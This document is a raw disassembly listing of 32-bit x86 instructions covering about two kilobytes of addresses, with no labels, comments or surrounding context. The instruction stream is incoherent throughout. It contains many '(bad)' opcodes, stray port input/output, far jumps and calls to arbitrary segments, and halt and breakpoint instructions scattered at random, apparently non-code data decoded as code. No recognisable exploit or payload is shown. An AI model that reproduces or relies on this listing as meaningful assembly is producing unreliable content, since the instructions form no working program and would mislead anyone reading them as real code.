  43d676:	sub    DWORD PTR [edx-0x11745a14],ebp
  43d67c:	in     eax,dx
  43d67d:	nop
  43d67e:	mov    ebx,0xc6ef1b8d
  43d683:	and    dl,0xc0
  43d686:	mov    dh,0x34
  43d688:	mov    eax,ds:0x75c91b4d
  43d68d:	xchg   esi,eax
  43d68e:	shl    bh,1
  43d690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d691:	sub    ebp,ecx
  43d693:	dec    BYTE PTR [ebx-0x37]
  43d696:	loop   0x43d6fa
  43d698:	fmulp  st(6),st
  43d69a:	push   0xdb0942c
  43d69f:	out    0x11,eax
  43d6a1:	test   al,0x1b
  43d6a3:	data16 ficomp DWORD PTR [ecx-0x39]
  43d6a7:	and    al,0xee
  43d6a9:	push   0x45
  43d6ab:	retf   
  43d6ac:	(bad)  
  43d6ad:	(bad)  [ecx-0x426963c]
  43d6b3:	push   ebp
  43d6b4:	mov    ch,0x91
  43d6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d6b7:	in     al,dx
  43d6b8:	mov    ebx,0xec365d30
  43d6bd:	fdiv   QWORD PTR [ebx-0x5b]
  43d6c0:	jb     0x43d664
  43d6c2:	loop   0x43d6b3
  43d6c4:	aaa    
  43d6c5:	adc    DWORD PTR [esi],esi
  43d6c7:	pop    ss
  43d6c8:	jae    0x43d710
  43d6ca:	mov    edi,0x74f4e954
  43d6cf:	into   
  43d6d0:	ja     0x43d6c5
  43d6d2:	jmp    0x43d694
  43d6d4:	push   esp
  43d6d5:	cdq    
  43d6d6:	jmp    0x43d709
  43d6d8:	jns    0x43d685
  43d6da:	clc    
  43d6db:	imul   ebx,DWORD PTR ds:0xb9fbda9,0xffb37df0
  43d6e5:	mov    eax,ds:0x312119b
  43d6ea:	and    cl,bl
  43d6ec:	sub    esi,DWORD PTR [eax+0x42]
  43d6ef:	mov    al,BYTE PTR [esi-0x6ffb4180]
  43d6f5:	or     edi,DWORD PTR [ecx]
  43d6f7:	cmp    eax,0xf12ee3b5
  43d6fc:	aad    0xf
  43d6fe:	sbb    ah,BYTE PTR [esi+0xe]
  43d701:	sti    
  43d702:	jne    0x43d722
  43d704:	and    cl,dl
  43d706:	dec    ebp
  43d707:	cmp    DWORD PTR [esi-0x3bba659f],0xffffffaa
  43d70e:	aad    0x90
  43d710:	fsub   QWORD PTR [edi-0x62cb90c1]
  43d716:	mov    ecx,ebp
  43d718:	push   es
  43d719:	(bad)  
  43d71a:	xchg   edx,eax
  43d71b:	sbb    BYTE PTR [ebx],bh
  43d71d:	scas   eax,DWORD PTR es:[edi]
  43d71e:	outs   dx,BYTE PTR ds:[esi]
  43d71f:	mov    esp,0xb4b971fd
  43d724:	push   ds
  43d725:	add    DWORD PTR [edi],0x3318052a
  43d72b:	lock pop eax
  43d72d:	mov    ebx,0xf77ed86e
  43d732:	push   ss
  43d733:	push   esp
  43d734:	sub    DWORD PTR [ebx-0x4a],0x64
  43d738:	xor    al,0x49
  43d73a:	jae    0x43d74e
  43d73c:	inc    ebp
  43d73d:	div    BYTE PTR [ebx-0x34bbf0f]
  43d743:	ja     0x43d765
  43d745:	stc    
  43d746:	cmc    
  43d747:	in     eax,dx
  43d748:	addr16 hlt 
  43d74a:	push   edx
  43d74b:	adc    al,0x76
  43d74d:	pop    ss
  43d74e:	jl     0x43d6e5
  43d750:	pop    ss
  43d751:	int3   
  43d752:	clc    
  43d753:	not    BYTE PTR [eax]
  43d755:	mov    eax,ds:0xa8b95bd8
  43d75a:	jmp    0xb138e781
  43d75f:	and    al,0x60
  43d761:	outs   dx,DWORD PTR ds:[esi]
  43d762:	scas   eax,DWORD PTR es:[edi]
  43d763:	sbb    esi,DWORD PTR [ebp+0x1ce91a06]
  43d769:	fwait
  43d76a:	jae    0x43d6f4
  43d76c:	mov    al,0x6c
  43d76e:	les    ebx,FWORD PTR [edx+0x25]
  43d771:	pop    ecx
  43d772:	pop    esp
  43d773:	dec    esi
  43d774:	push   ebx
  43d775:	mov    edx,0xa723adc6
  43d77a:	sti    
  43d77b:	bound  esp,QWORD PTR [edx]
  43d77d:	dec    esi
  43d77e:	es loopne 0x43d720
  43d781:	mov    BYTE PTR [eax+0x2e],ah
  43d784:	jle    0x43d769
  43d786:	sub    eax,0xbd9e0b25
  43d78b:	or     eax,0xe4cc3c79
  43d790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d791:	inc    edx
  43d792:	dec    edi
  43d793:	repz sti 
  43d795:	lea    esp,ds:0x979925a5
  43d79b:	int3   
  43d79c:	jmp    0x43d78e
  43d79e:	mov    ch,0xce
  43d7a0:	mov    ds:0x5e4dfb9d,eax
  43d7a5:	out    dx,al
  43d7a6:	enter  0x8da1,0xbd
  43d7aa:	mov    esp,0x98bccc1f
  43d7af:	fadd   QWORD PTR ds:0x89e51ddf
  43d7b5:	aad    0x6a
  43d7b7:	aad    0xd9
  43d7b9:	jge    0x43d7eb
  43d7bb:	leave  
  43d7bc:	push   ss
  43d7bd:	xchg   edi,eax
  43d7be:	mov    dh,0x1c
  43d7c0:	adc    eax,0x8e883173
  43d7c5:	(bad)  
  43d7c6:	mov    edx,0x14773914
  43d7cb:	mov    edi,0xdd90c0c9
  43d7d0:	push   ds
  43d7d1:	inc    esp
  43d7d2:	mov    edx,0x8c6a4c94
  43d7d7:	jae    0x43d7c5
  43d7d9:	es add ax,0xe1b
  43d7de:	or     bl,BYTE PTR [eax+0x20eba376]
  43d7e4:	mov    ds:0xa6f14191,eax
  43d7e9:	inc    esi
  43d7ea:	or     eax,0xb48b3834
  43d7ef:	test   BYTE PTR [ebp+0x7567c43a],bl
  43d7f5:	nop
  43d7f6:	stos   DWORD PTR es:[edi],eax
  43d7f7:	stc    
  43d7f8:	inc    esi
  43d7f9:	int    0xb9
  43d7fb:	jbe    0x43d7f4
  43d7fd:	mov    bl,0xa9
  43d7ff:	jmp    0x60a2:0x679d0f55
  43d806:	mov    dl,0x64
  43d808:	mov    ds:0x921b8ba2,al
  43d80d:	sahf   
  43d80e:	cmp    cl,BYTE PTR [edi-0x43]
  43d811:	in     eax,dx
  43d812:	fcmovu st,st(1)
  43d814:	sub    al,0x8
  43d816:	and    esp,DWORD PTR ds:0xc4c81d1c
  43d81c:	mov    ds:0xeb505b9c,eax
  43d821:	jp     0x43d810
  43d823:	in     al,dx
  43d824:	icebp  
  43d825:	pop    es
  43d826:	cs fs pop eax
  43d829:	pop    esp
  43d82a:	mov    edx,0x77b09a34
  43d82f:	popf   
  43d830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d831:	cdq    
  43d832:	aad    0xe4
  43d834:	push   ebx
  43d835:	jmp    0x810df36c
  43d83a:	adc    ecx,ebx
  43d83c:	in     eax,dx
  43d83d:	or     edi,esp
  43d83f:	mov    ah,0xc8
  43d841:	loop   0x43d819
  43d843:	push   ss
  43d844:	xchg   esp,eax
  43d845:	sbb    dh,BYTE PTR [esi+0x4c906a00]
  43d84b:	mov    ds:0xc611b31a,eax
  43d850:	lods   al,BYTE PTR ds:[esi]
  43d851:	call   0x741b5261
  43d856:	mov    dh,0x14
  43d858:	(bad)
  43d85d:	inc    edi
  43d85e:	adc    bh,ah
  43d860:	jae    0x43d87e
  43d862:	push   esi
  43d863:	mov    bl,0x1e
  43d865:	jns    0x43d7f0
  43d867:	mov    WORD PTR [edi],?
  43d869:	push   edi
  43d86a:	je     0x43d8a2
  43d86c:	adc    edx,DWORD PTR [ebp+0x2904bfda]
  43d872:	stos   DWORD PTR es:[edi],eax
  43d873:	jmp    0x43d88e
  43d875:	fnstcw WORD PTR [edx+0x5c]
  43d878:	call   0x8ba3:0xc4176ea2
  43d87f:	dec    esi
  43d880:	in     eax,dx
  43d881:	mov    ch,0x50
  43d883:	jb     0x43d85a
  43d885:	(bad)  
  43d887:	and    ecx,esp
  43d889:	lea    ebx,[edi-0xdec717b]
  43d88f:	ror    BYTE PTR [ebp+0x40],1
  43d892:	inc    ecx
  43d893:	add    eax,0xf92dda7d
  43d898:	ds pushf 
  43d89a:	mov    ebx,0x57eedae3
  43d89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d8a0:	xor    dh,bh
  43d8a2:	fdiv   st(1),st
  43d8a4:	sbb    ebp,DWORD PTR [ebp-0x44]
  43d8a7:	mov    ah,0x8c
  43d8a9:	jmp    0x43d8ac
  43d8ab:	sub    al,0xe5
  43d8ad:	scas   ax,WORD PTR es:[edi]
  43d8af:	out    dx,al
  43d8b0:	cmp    bl,dl
  43d8b2:	xor    eax,esi
  43d8b4:	dec    ebx
  43d8b5:	cmp    DWORD PTR [eax-0x31b50957],esi
  43d8bb:	mov    es,WORD PTR [edx+0x1b]
  43d8be:	add    eax,0xf9ca256f
  43d8c3:	out    0x39,al
  43d8c5:	retf   0x1a52
  43d8c8:	dec    esi
  43d8c9:	sbb    DWORD PTR [eax+0x1],ebx
  43d8cc:	retf   0x124b
  43d8cf:	push   es
  43d8d0:	push   ebx
  43d8d1:	psadbw mm6,mm0
  43d8d4:	mov    ch,0xaf
  43d8d6:	call   0x7f1ae5c8
  43d8db:	inc    eax
  43d8dc:	or     DWORD PTR [edx-0x626c67b2],ebx
  43d8e2:	xor    edx,DWORD PTR [esi+0x3942daff]
  43d8e8:	push   ss
  43d8e9:	shl    BYTE PTR [eax-0x63],0x20
  43d8ed:	loope  0x43d8a4
  43d8ef:	sbb    al,0xb7
  43d8f1:	xor    al,0x5b
  43d8f3:	mov    BYTE PTR [esi],al
  43d8f5:	test   al,0xa3
  43d8f7:	cwde   
  43d8f8:	shl    BYTE PTR [edi],0xa2
  43d8fb:	inc    ebp
  43d8fc:	rcr    DWORD PTR [ebx-0x7b1c2c65],cl
  43d902:	ss mov edi,0x6b9d3a38
  43d908:	sbb    eax,0x70fc1317
  43d90d:	inc    ebp
  43d90e:	push   esi
  43d90f:	add    eax,0xdeaebae4
  43d914:	cmc    
  43d915:	cwde   
  43d916:	mov    cl,0x28
  43d918:	int3   
  43d919:	cmp    eax,0x5126ad8f
  43d91e:	mov    ebx,0xe54b6210
  43d923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d924:	jb     0x43d8e4
  43d926:	icebp  
  43d927:	das    
  43d928:	js     0x43d986
  43d92a:	mov    dl,0x14
  43d92c:	mov    eax,DWORD PTR [esi-0x14]
  43d92f:	(bad)  [ebp-0x1a02895c]
  43d935:	stos   BYTE PTR es:[edi],al
  43d936:	pop    ss
  43d937:	xchg   edx,eax
  43d938:	in     eax,0x29
  43d93a:	ds jae 0x43d94b
  43d93d:	jge    0x43d90f
  43d93f:	cmp    ecx,ebp
  43d941:	out    dx,al
  43d942:	sbb    eax,0xe4ad50ed
  43d947:	jno    0x43d98e
  43d949:	pushf  
  43d94a:	hlt    
  43d94b:	in     eax,0xf0
  43d94d:	jb     0x43d996
  43d94f:	and    ebp,DWORD PTR fs:[ecx-0x37]
  43d953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d954:	mov    bl,BYTE PTR [edi+0x42]
  43d957:	ds clc 
  43d959:	cdq    
  43d95a:	sti    
  43d95b:	stc    
  43d95c:	std    
  43d95d:	add    eax,0x27f9a8f9
  43d962:	shl    ebp,0xd
  43d965:	aad    0xb3
  43d967:	je     0x43d98d
  43d969:	sub    dl,dh
  43d96b:	mov    edx,0x386ba51d
  43d970:	adc    edi,edi
  43d972:	or     al,0x40
  43d974:	mov    ebx,0xa09e137a
  43d979:	push   ds
  43d97a:	and    dh,BYTE PTR ds:0x89152629
  43d980:	pop    ds
  43d981:	cmp    ebx,DWORD PTR [ebp+0x228fa57a]
  43d987:	out    0x29,eax
  43d989:	mov    BYTE PTR [esi-0xd277afd],ah
  43d98f:	daa    
  43d990:	mov    edx,0xf8e799a3
  43d995:	or     al,0xba
  43d997:	adc    al,0xd0
  43d999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d99a:	xchg   esi,eax
  43d99b:	les    esi,FWORD PTR [ebp+0x50]
  43d99e:	leave  
  43d99f:	in     eax,dx
  43d9a0:	mov    ebp,0x1b2bd5da
  43d9a5:	jns    0x43da20
  43d9a7:	cwde   
  43d9a8:	cmp    dh,BYTE PTR [ebp+0x4]
  43d9ab:	xchg   DWORD PTR [edx-0x42a7437e],ecx
  43d9b1:	outs   dx,BYTE PTR ds:[esi]
  43d9b2:	ror    edi,1
  43d9b4:	sbb    edx,0xffffffbc
  43d9b7:	fcomp  QWORD PTR [ebx]
  43d9b9:	stc    
  43d9ba:	cmp    sp,WORD PTR [ebx+0x1b]
  43d9be:	mov    bh,ah
  43d9c0:	jb     0x43d958
  43d9c2:	aas    
  43d9c3:	push   edx
  43d9c4:	inc    esi
  43d9c5:	mov    DWORD PTR [ecx+0x68653919],esi
  43d9cb:	mov    ah,BYTE PTR [edx]
  43d9cd:	int    0xd2
  43d9cf:	loop   0x43d9f0
  43d9d1:	and    BYTE PTR [ebx],0xd
  43d9d4:	fmul   QWORD PTR [ebx]
  43d9d6:	mov    cl,0xb4
  43d9d8:	fistp  WORD PTR fs:[ecx+0xcdea5ab]
  43d9df:	out    0xea,al
  43d9e1:	sub    eax,0x91e9c25
  43d9e6:	out    0x3d,al
  43d9e8:	inc    ebp
  43d9e9:	pop    es
  43d9ea:	cmp    DWORD PTR [edi+0x671bb70f],ebp
  43d9f0:	pusha  
  43d9f1:	fisubr DWORD PTR [eax-0x561a606f]
  43d9f7:	pop    edx
  43d9f8:	iret   
  43d9f9:	jo     0x43d9b2
  43d9fb:	adc    edx,edx
  43d9fd:	fistp  QWORD PTR [eax]
  43d9ff:	inc    edi
  43da00:	lea    ebp,[ebp+0x77b1d695]
  43da06:	mov    bl,0xf8
  43da08:	push   ebp
  43da09:	fwait
  43da0a:	mov    ebx,0x661bb7a9
  43da0f:	cmp    dh,BYTE PTR [ecx]
  43da11:	icebp  
  43da12:	call   0x4214:0xb1a1e389
  43da19:	jne    0x43d9e6
  43da1b:	jp     0x43da02
  43da1d:	dec    edi
  43da1e:	scas   al,BYTE PTR es:[edi]
  43da1f:	out    dx,al
  43da20:	mov    eax,ds:0x24835884
  43da25:	cmp    DWORD PTR [edi+0x7],edi
  43da28:	sar    DWORD PTR [edx],cl
  43da2a:	add    BYTE PTR [ebx+0x2c],al
  43da2d:	xchg   edx,eax
  43da2e:	sbb    al,0x7d
  43da30:	test   ah,0x53
  43da33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43da34:	pop    edx
  43da35:	lods   eax,DWORD PTR ds:[esi]
  43da36:	out    0x48,eax
  43da38:	push   esp
  43da39:	and    ecx,DWORD PTR [ecx-0x70]
  43da3c:	and    cl,BYTE PTR [ecx]
  43da3e:	retf   0xd2f6
  43da41:	dec    ecx
  43da42:	out    dx,eax
  43da43:	xor    eax,DWORD PTR [edx+0xa]
  43da46:	mov    WORD PTR [esi-0x74],fs
  43da49:	bound  esp,QWORD PTR [edi-0x4df43907]
  43da4f:	in     al,dx
  43da50:	lock mov bl,ch
  43da53:	inc    edx
  43da54:	pop    ss
  43da55:	push   ecx
  43da56:	or     edx,DWORD PTR [edi+0x3271d8d8]
  43da5c:	inc    ebp
  43da5d:	ins    DWORD PTR es:[edi],dx
  43da5e:	jbe    0x43da4a
  43da60:	push   cs
  43da61:	add    ebx,DWORD PTR [esi]
  43da63:	shr    BYTE PTR [edi-0x1ad6c054],0xca
  43da6a:	cwde   
  43da6b:	in     eax,0xbb
  43da6d:	push   ds
  43da6e:	in     al,dx
  43da6f:	dec    edi
  43da70:	cmc    
  43da71:	dec    ebx
  43da72:	(bad)  
  43da73:	jmp    0x9878ddfd
  43da78:	and    al,0x19
  43da7a:	shl    ah,0x10
  43da7d:	shr    DWORD PTR [ecx],1
  43da7f:	adc    esi,edi
  43da81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43da82:	sbb    ebp,DWORD PTR [eax+0x2b]
  43da85:	xor    esp,DWORD PTR [ecx-0x63d8e3bc]
  43da8b:	loopne 0x43da24
  43da8d:	into   
  43da8e:	in     al,dx
  43da8f:	lds    edx,FWORD PTR [ebp-0x3f106805]
  43da95:	ficomp DWORD PTR [ecx]
  43da97:	dec    ebx
  43da98:	(bad)  
  43da99:	out    dx,eax
  43da9a:	mov    dh,0xf4
  43da9c:	add    eax,0x5979a3b
  43daa1:	idiv   al
  43daa3:	out    dx,eax
  43daa4:	imul   BYTE PTR [esi+0xe]
  43daa7:	out    dx,eax
  43daa8:	xor    BYTE PTR [ecx],bl
  43daaa:	pusha  
  43daab:	add    DWORD PTR [ecx],0x3d
  43daae:	jnp    0x43daa5
  43dab0:	mov    bh,0xf8
  43dab2:	mov    ds:0xb20b349f,al
  43dab7:	adc    al,0x24
  43dab9:	leave  
  43daba:	sbb    eax,0x5fe20713
  43dabf:	loop   0x43da65
  43dac1:	xchg   BYTE PTR [ebx+eiz*8-0x4b],bl
  43dac5:	xchg   DWORD PTR [esi+0x57],edi
  43dac8:	(bad)  
  43daca:	mov    ecx,0xbd2950d2
  43dacf:	push   es
  43dad0:	xchg   edx,eax
  43dad1:	mov    bl,ch
  43dad3:	out    0xce,eax
  43dad5:	fsub   st,st(4)
  43dad7:	jmp    0xf73e5e41
  43dadc:	mov    BYTE PTR [esi],cl
  43dade:	jns    0x43da9f
  43dae0:	xlat   BYTE PTR ds:[ebx]
  43dae1:	pop    ax
  43dae3:	jmp    0x1e8:0x44b8a17b
  43daea:	aad    0xcd
  43daec:	lea    esp,[edi+0x7f886f6b]
  43daf2:	call   0x13e2:0x4f106e4
  43daf9:	push   ebp
  43dafa:	out    0x24,eax
  43dafc:	xchg   esi,eax
  43dafd:	and    ebx,DWORD PTR [ecx+0x63]
  43db00:	sbb    BYTE PTR [ecx-0x4a80ee35],ah
  43db06:	or     DWORD PTR [esi],edx
  43db08:	inc    ebp
  43db09:	xor    eax,0x753547ac
  43db0e:	js     0x43db76
  43db10:	xor    bh,0xb1
  43db13:	dec    esp
  43db14:	and    BYTE PTR [edi],bl
  43db16:	sbb    esi,DWORD PTR [ebp+0x14247167]
  43db1c:	test   DWORD PTR [esi-0x3bb20d40],ecx
  43db22:	cmp    al,0x30
  43db24:	nop
  43db25:	sub    ch,cl
  43db27:	adc    al,0x20
  43db29:	and    edi,DWORD PTR [eax]
  43db2b:	add    al,0xa6
  43db2d:	mov    ds:0xe118133b,al
  43db32:	sbb    bh,ch
  43db34:	and    edi,DWORD PTR [ebp+0x781369ef]
  43db3a:	test   eax,0x7b08ff15
  43db3f:	hlt    
  43db40:	adc    al,ch
  43db42:	inc    edx
  43db43:	fs jbe 0x43db0b
  43db46:	leave  
  43db47:	mov    eax,ds:0xe86f39fb
  43db4c:	push   ss
  43db4d:	fldcw  WORD PTR [ecx+eiz*2+0x2b]
  43db51:	adc    DWORD PTR [eax+ebx*1],edx
  43db54:	pop    eax
  43db55:	xchg   edx,eax
  43db56:	mov    bh,0x64
  43db58:	int    0x62
  43db5a:	ret    
  43db5b:	inc    edi
  43db5c:	test   DWORD PTR [esi+0x448eebdf],eax
  43db62:	retf   0x22ed
  43db65:	sbb    DWORD PTR [edx-0xcc3be82],ebx
  43db6b:	pop    ss
  43db6c:	ss cdq 
  43db6e:	dec    ebx
  43db6f:	popf   
  43db70:	add    al,0xd5
  43db72:	jp     0x43dbb0
  43db74:	clc    
  43db75:	adc    ebx,esp
  43db77:	fs push ecx
  43db79:	pop    ss
  43db7a:	mov    ecx,0x31bac24
  43db7f:	adc    DWORD PTR [ebp+0x3e],0x72d9eeff
  43db86:	inc    ebp
  43db87:	enter  0xe90d,0x38
  43db8b:	mov    dl,0x16
  43db8d:	cmp    DWORD PTR [edx+0x7b],edi
  43db90:	ss jno 0x43dc0e
  43db93:	push   edi
  43db94:	sub    DWORD PTR [ebx-0x7fa15125],ebx
  43db9a:	scas   eax,DWORD PTR es:[edi]
  43db9b:	push   ebp
  43db9c:	cmp    BYTE PTR [edx],ch
  43db9e:	or     al,0x50
  43dba0:	nop
  43dba1:	les    esi,FWORD PTR [esi-0x33e9144c]
  43dba7:	psubd  mm2,QWORD PTR [esi+0x35]
  43dbab:	test   al,0x5b
  43dbad:	aad    0xb0
  43dbaf:	and    al,0x29
  43dbb1:	lds    ebx,FWORD PTR [ebx+edi*2]
  43dbb4:	sub    BYTE PTR [esi-0x12],cl
  43dbb7:	in     al,0x1a
  43dbb9:	push   esp
  43dbba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dbbb:	push   eax
  43dbbc:	adc    cl,bh
  43dbbe:	repz out 0xe5,eax
  43dbc1:	sar    DWORD PTR [esi+0xb810eec],cl
  43dbc7:	cmc    
  43dbc8:	call   eax
  43dbca:	fidivr DWORD PTR [eax+esi*4+0x7124be25]
  43dbd1:	(bad)  
  43dbd2:	(bad)  
  43dbd4:	out    0x3c,al
  43dbd6:	or     eax,0x7bb170a
  43dbdb:	jmp    DWORD PTR [ecx-0x448f41b1]
  43dbe1:	mov    edi,0xd5e3d4bb
  43dbe6:	push   esi
  43dbe7:	inc    esp
  43dbe8:	pop    ebx
  43dbe9:	jo     0x43dc1b
  43dbeb:	hlt    
  43dbec:	cmp    al,0x43
  43dbee:	into   
  43dbef:	pop    eax
  43dbf0:	out    0x8c,eax
  43dbf2:	rol    DWORD PTR [edx+edi*1-0x39],0x3d
  43dbf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43dbf8:	pop    edi
  43dbf9:	sub    DWORD PTR [ebx+esi*2-0x4b],0xd7ee0011
  43dc01:	fcomp  DWORD PTR [edx+0x2a]
  43dc04:	sbb    al,0x9
  43dc06:	xchg   ecx,eax
  43dc07:	sub    edx,ebp
  43dc09:	and    eax,0xb98096be
  43dc0e:	sbb    esi,ebx
  43dc10:	retf   0x4dc4
  43dc13:	leave  
  43dc14:	and    esi,DWORD PTR [ebp+0x43]
  43dc17:	jp     0x43dbad
  43dc19:	mov    edx,0x3a136ab4
  43dc1e:	outs   dx,DWORD PTR ds:[esi]
  43dc1f:	clc    
  43dc20:	and    eax,0xc5b6514d
  43dc25:	pusha  
  43dc26:	sahf   
  43dc27:	pushf  
  43dc28:	xor    eax,0xb3ee32f7
  43dc2d:	call   0xddc3:0x5cd06949
  43dc34:	and    eax,0x27e8eed4
  43dc39:	aad    0x79
  43dc3b:	and    al,0x48
  43dc3d:	xchg   ebp,eax
  43dc3e:	xor    dl,BYTE PTR [edi+eax*1-0x65]
  43dc42:	inc    esi
  43dc43:	adc    eax,0x4730591b
  43dc48:	int3   
  43dc49:	aad    0x83
  43dc4b:	pop    DWORD PTR [ebp-0x5c]
  43dc4e:	jmp    0x43dcbb
  43dc50:	xchg   edi,eax
  43dc51:	inc    ebp
  43dc52:	dec    ebx
  43dc53:	dec    ebp
  43dc54:	mov    edi,0x1a5df4be
  43dc59:	or     al,0xb1
  43dc5b:	test   BYTE PTR [eax+0x49f85d2c],cl
  43dc61:	arpl   WORD PTR [eax-0x2b],si
  43dc64:	pop    esp
  43dc65:	repz das 
  43dc67:	cmp    eax,0x1ad3fa99
  43dc6c:	(bad)  [eax+0x3954b249]
  43dc72:	mov    al,0xbf
  43dc74:	(bad)  
  43dc75:	aas    
  43dc76:	push   cs
  43dc77:	adc    DWORD PTR [edi-0x7b],edi
  43dc7a:	and    esp,DWORD PTR [edi-0x5b]
  43dc7d:	jno    0x43dcef
  43dc7f:	out    0x49,eax
  43dc81:	idiv   BYTE PTR [eax-0xbb6e10a]
  43dc87:	test   ch,bh
  43dc89:	dec    edx
  43dc8a:	xchg   ebp,eax
  43dc8b:	ret    0x95e3
  43dc8e:	or     eax,0x7e831194
  43dc93:	xchg   esi,eax
  43dc94:	xchg   BYTE PTR [edx],dl
  43dc96:	(bad)  
  43dc97:	sbb    BYTE PTR [edx+0x7c1a26b3],bl
  43dc9d:	ja     0x43dc81
  43dc9f:	icebp  
  43dca0:	cmc    
  43dca1:	adc    edi,eax
  43dca3:	les    eax,FWORD PTR [esi-0x22]
  43dca6:	aaa    
  43dca7:	jo     0x43dcc5
  43dca9:	fwait
  43dcaa:	cmp    esp,ebx
  43dcac:	(bad)  
  43dcad:	test   al,0x53
  43dcaf:	icebp  
  43dcb0:	xchg   edi,eax
  43dcb1:	jp     0x43dcaa
  43dcb3:	fld    st(5)
  43dcb5:	dec    esi
  43dcb6:	mov    esp,0xf59d0c54
  43dcbb:	adc    dl,BYTE PTR ds:0x46e4d92d
  43dcc1:	in     al,dx
  43dcc2:	gs das 
  43dcc4:	and    bh,cl
  43dcc6:	pop    edi
  43dcc7:	iret   
  43dcc8:	push   edi
  43dcc9:	xlat   BYTE PTR ds:[ebx]
  43dcca:	in     eax,dx
  43dccb:	sub    BYTE PTR [ebx+0x42],ch
  43dcce:	cmp    ecx,DWORD PTR [ebp-0x5b]
  43dcd1:	inc    ecx
  43dcd2:	dec    eax
  43dcd3:	hlt    
  43dcd4:	or     al,0x53
  43dcd6:	push   edx
  43dcd7:	jmp    0x43dca2
  43dcd9:	pusha  
  43dcda:	lods   eax,DWORD PTR ds:[esi]
  43dcdb:	mov    edx,0x14b65138
  43dce0:	sub    esp,esp
  43dce2:	ret    0x4563
  43dce5:	xor    BYTE PTR [eax-0x10],dh
  43dce8:	sbb    edx,0xfffffff6
  43dceb:	(bad)  
  43dcec:	and    ecx,DWORD PTR [ecx]
  43dcee:	ins    DWORD PTR es:[edi],dx
  43dcef:	(bad)  
  43dcf0:	pop    eax
  43dcf1:	mov    cl,0xb3
  43dcf3:	push   ebp
  43dcf4:	fs cwde 
  43dcf6:	in     al,dx
  43dcf7:	js     0x43dd2c
  43dcf9:	mov    ebp,0x4ba261a5
  43dcfe:	mov    dh,0x36
  43dd00:	jle    0x43dce9
  43dd02:	adc    ah,BYTE PTR [ecx+0x12]
  43dd05:	jae    0x43dcc1
  43dd07:	push   esp
  43dd08:	or     eax,0xd5b3e832
  43dd0d:	and    al,al
  43dd0f:	out    0x25,al
  43dd11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd12:	xchg   edx,eax
  43dd13:	xor    eax,0x22109070
  43dd18:	mov    ecx,0x3bb4ba86
  43dd1d:	jno    0x43dcfb
  43dd1f:	call   0x5c40:0x248a2a26
  43dd26:	xchg   edi,eax
  43dd27:	rol    BYTE PTR [eax+0x26043dd2],cl
  43dd2d:	and    dh,BYTE PTR [edx-0x40a799c]
  43dd33:	scas   al,BYTE PTR es:[edi]
  43dd34:	and    eax,0xe1ed11b7
  43dd39:	inc    eax
  43dd3a:	loopne 0x43dceb
  43dd3c:	sbb    al,0x99
  43dd3e:	repnz hlt 
  43dd40:	pusha  
  43dd41:	outs   dx,BYTE PTR ds:[esi]
  43dd42:	xlat   BYTE PTR ds:[ebx]
  43dd43:	add    dx,bp
  43dd46:	pop    ebx
  43dd47:	mov    eax,0x4d9f7f88
  43dd4c:	sahf   
  43dd4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd4e:	jg     0x43dcec
  43dd50:	sub    DWORD PTR [ecx],ebx
  43dd52:	fist   WORD PTR [eax+esi*2]
  43dd55:	or     eax,0xe864f2e4
  43dd5a:	xor    DWORD PTR cs:[ebx],eax
  43dd5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dd5e:	stos   DWORD PTR es:[edi],eax
  43dd5f:	out    0x1c,eax
  43dd61:	out    dx,eax
  43dd62:	rcr    ebp,0xc2
  43dd65:	dec    ebp
  43dd66:	jns    0x43dd98
  43dd68:	(bad)  [eax-0x684636a8]
  43dd6e:	mov    ebp,0x8acbaab4
  43dd73:	pop    ss
  43dd74:	xchg   ebp,eax
  43dd75:	(bad)  
  43dd78:	add    eax,0x5ede6fb0
  43dd7d:	mul    ah
  43dd7f:	sbb    al,0x6
  43dd81:	jb     0x43dd3e
  43dd83:	fstp   DWORD PTR [edx]
  43dd85:	cmp    DWORD PTR [ecx-0x1],ebp
  43dd88:	rcr    BYTE PTR [eax+ebp*4-0x67bd63d4],0x95
  43dd90:	cmc    
  43dd91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dd92:	ins    BYTE PTR es:[edi],dx
  43dd93:	out    0x8c,al
  43dd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dd96:	dec    ebx
  43dd97:	(bad)  
  43dd98:	out    0xd8,eax
  43dd9a:	pop    eax
  43dd9b:	and    BYTE PTR [edi],ch
  43dd9d:	ins    BYTE PTR es:[edi],dx
  43dd9e:	jne    0x43de1a
  43dda0:	xchg   edi,eax
  43dda1:	xchg   esi,eax
  43dda2:	jl     0x43dddc
  43dda4:	fcomp  DWORD PTR [ebx+0xd5381b1]
  43ddaa:	and    al,0x7c
  43ddac:	test   eax,ebx
  43ddae:	pop    ebp
  43ddaf:	repnz sbb DWORD PTR [edx*2+0x20bad61f],ebp
  43ddb7:	add    edi,DWORD PTR [ebx+0x6ae3b3a0]
  43ddbd:	cmp    BYTE PTR gs:[ecx+0x40bbd7c0],ah
  43ddc4:	je     0x43de26
  43ddc6:	mov    ebx,0x60faf3b1
  43ddcb:	add    al,dl
  43ddcd:	push   ecx
  43ddce:	dec    ebp
  43ddcf:	out    dx,eax
  43ddd0:	adc    eax,0x9cebf4f5
  43ddd5:	fwait
  43ddd6:	retf   
  43ddd7:	cmp    DWORD PTR [eax-0x48],esp
  43ddda:	stos   BYTE PTR es:[edi],al
  43dddb:	loope  0x43dd63
  43dddd:	ins    DWORD PTR es:[edi],dx
  43ddde:	xchg   edx,eax
  43dddf:	into   
  43dde0:	sbb    BYTE PTR [eax-0x1661eb37],cl
  43dde6:	(bad)  
  43dde8:	rcr    DWORD PTR [edx+0x7d],1
